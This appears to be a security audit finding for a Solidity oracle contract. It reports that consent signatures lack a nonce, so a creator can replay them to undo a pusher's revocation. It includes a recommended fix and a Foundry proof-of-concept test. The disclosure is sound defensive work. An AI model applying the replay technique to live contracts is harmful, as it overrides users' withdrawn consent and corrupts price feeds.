### Title
Creator Can Replay Pusher Consent Signature to Nullify `revokePusher()` Within the Deadline Window — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` in `CompressedOracleV1` verifies a pusher's EIP-191 consent signature but never marks it as consumed. Because the signature domain contains no nonce, a creator can call `allowPushers` an unlimited number of times with the same signature before the deadline expires. This lets the creator silently undo every `revokePusher()` call the pusher makes, keeping the pusher's price pushes redirected into the creator's namespace against the pusher's will.

---

### Finding Description

The consent signature is bound to `(block.chainid, address(this), deadline, pusher, msg.sender)`. [1](#0-0) 

There is no nonce and no used-signature bitmap. A grep across all production contracts confirms zero occurrences of any `usedSignature`, `signatureUsed`, `nonce`, or `invalidate` guard.

The code comment at lines 186–191 explicitly acknowledges the deadline is the protection against post-revocation replay: [2](#0-1) 

However, the deadline only bounds the outer window — it does not prevent the creator from replaying the same valid signature multiple times **within** that window. After a pusher calls `revokePusher()`: [3](#0-2) 

…the creator can immediately call `allowPushers` again with the identical signature, restoring `namespaceRemapping[pusher] = creator`. This cycle repeats indefinitely until the deadline timestamp passes.

The `fallback` push path resolves the namespace at call time: [4](#0-3) 

So every push the pusher makes after a "successful" revocation still lands in the creator's namespace as long as the creator keeps replaying the delegation.

---

### Impact Explanation

The creator's namespace feeds are what production price providers and pools consume. A creator who has lost a pusher's consent can maintain continuous write authority over their namespace feeds by replaying the signature on every block after the pusher revokes. The pusher's only effective defense is to stop pushing entirely — which also kills their own namespace. Any pool whose `PriceProvider` reads from the creator's compressed-oracle namespace will continue receiving the pusher's price data even after the pusher has explicitly withdrawn consent, enabling the creator to sustain a price feed that the pusher no longer endorses.

---

### Likelihood Explanation

The creator already holds the signature (they received it during the initial `allowPushers` call). Replaying it requires a single on-chain transaction per revocation event. The creator can watch for `PusherRevoked` events and front-run or immediately follow with a replay. No special privilege or off-chain capability is needed beyond the already-held signature bytes.

---

### Recommendation

Mark each consent signature as consumed on first use with a `mapping(bytes32 => bool) private _usedConsentSigs` keyed on the signature hash, and revert if the same hash is presented again:

```solidity
mapping(bytes32 => bool) private _usedConsentSigs;

// inside allowPushers loop:
bytes32 sigHash = keccak256(signatures[i]);
require(!_usedConsentSigs[sigHash], "signature already used");
_usedConsentSigs[sigHash] = true;
```

Alternatively, include a per-pusher nonce in the signed domain so each consent is single-use by construction.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// Demonstrates that revokePusher() is ineffective within the deadline window.
// Run with: forge test --match-test testReplayRevokedDelegation -vvv

function testReplayRevokedDelegation() public {
    uint256 deadline = block.timestamp + 1 days;

    // 1. Pusher signs consent for creator (done once, off-chain or in setUp).
    bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // 2. Creator establishes delegation.
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // 3. Pusher revokes — expects to push into own namespace from now on.
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

    // 4. Creator replays the SAME signature — no nonce, no used-sig check.
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs); // succeeds silently
    assertEq(oracle.namespaceRemapping(pusher), creator, "delegation restored!");

    // 5. Pusher's next push lands in creator's namespace, not their own.
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 raw = _packRaw(999_999, 3, 1);
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
    assertTrue(ok);

    // Creator's namespace has the pusher's price — pusher's own namespace is empty.
    assertGt(oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price, 0,
        "creator namespace written despite revocation");
    assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0)).price, 0,
        "pusher own namespace empty — revocation was silently undone");
}
```
